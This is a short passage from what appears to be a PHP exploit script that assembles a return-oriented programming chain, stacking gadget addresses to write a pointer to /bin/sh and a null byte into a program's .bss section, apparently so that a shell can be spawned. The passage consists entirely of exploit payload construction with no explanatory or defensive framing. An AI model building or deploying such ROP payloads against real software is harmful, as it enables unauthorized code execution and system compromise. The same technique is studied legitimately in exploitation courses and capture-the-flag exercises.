...
$payload .= addr($bss3)."CCCC";
$payload .= addr($mov_mem_edx_eax);	//write pointer to /bin/sh into .bss+12

//putting nullbyte to end string
$payload .= addr($xor_eax_eax);	//put nullbyte into eax
//$payload .= addr("00");
$payload .= addr($pop_edx_ebx); //put .bss+12+4 into edx
$payload .= addr($bss4)."DDDD";
$payload .= addr($mov_mem_edx_eax); //write nullbyte into .bss+12+4
